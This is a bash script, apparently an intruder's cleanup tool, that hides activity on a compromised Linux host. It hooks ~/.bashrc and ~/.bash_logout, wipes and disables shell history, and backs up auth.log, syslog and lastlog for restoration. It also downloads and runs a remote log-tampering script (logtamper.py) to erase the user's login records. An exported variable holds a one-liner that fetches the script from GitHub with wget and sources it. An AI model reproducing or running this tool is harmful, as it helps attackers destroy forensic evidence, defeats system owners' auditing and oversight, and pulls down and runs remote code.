if [ -f ~/.bashrc ];then 
  cp ~/.bashrc /tmp/_bash;
else
  touch /tmp/_bash;
fi

if [ -f ~/.bash_logout ];then
  cp ~/.bash_logout /tmp/_bash_out;
else
  touch /tmp/_bash_out;
fi

cat clear.sh >> ~/.bashrc
echo "ByeHack; " >> ~/.bash_logout;
history -c ;


unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
export HISTFILE=/dev/null;
export HISTSIZE=0;
export HISTFILESIZE=0;
REST="\e[0m"
UNDERLINE="\e[4m"
ColorDefault="\e[39m"
ColorBlack="\e[30m"
ColorRed="\e[31m"
ColorGreen="\e[32m"
ColorYellow="\e[33m"
ColorBlue="\e[34m"
ColorMagenta="\e[35m"
ColorCyan="\e[36m"
ColorLightGray="\e[37m"
ColorDarkGray="\e[90m"
ColorLightRed="\e[91m"
ColorLightGreen="\e[92m"
ColorLightYellow="\e[93m"
ColorLightBlue="\e[94m"
ColorLightMagenta="\e[95m"
ColorLightCyan="\e[96m"
ColorWhite="\e[97m"


my_name="$(whoami)"
my_pts="$(who am i| awk '{print $2}' | xargs)"
my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;
index_f=/tmp/_fadsgindexfs;
flag="12412sdf"

function _bak {
  if [ -f $1 ];then
    cp -v $1 /tmp/  2>/dev/null 1>> $index_f
  fi
}

function _resume {
  eval $(cat $index_f | awk  -F "'" '{ print "cp -v ", $4, $2 }' )
}

function glog {
    echo "${ColorLightGreen}[!]${REST} ${ColorLightBlue}$* ${REST}"
}
glog "collection info for clear"

last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips
if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then
    glog "warnning user is logined in !!!! , so exit ";
    ByeHack;
else
    glog ${UNDERLINE}" safe ! -- enjoy your evil "
fi

_bak /var/log/auth.log;
_bak /var/log/syslog;
_bak /var/log/lastlog;

echo "${ColorLightGreen}[Good]${REST} ${ColorLightCyan} ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}"

function CL {
    wget --no-check-certificate  -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py'
    if [ -f logtamper.py ];then
	for ip_one in $(cat $my_ips);do
    	    python logtamper.py -m 2 -u $my_name -i $ip_one ;
        done
	rm logtamper.py
    fi
}

function ByeHack {
  mv /tmp/_bash ~/.bashrc
  mv /tmp/_bash_out ~/.bash_logout
  CL
  _resume;
}


export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; source clear.sh ; echo ok ; bash"
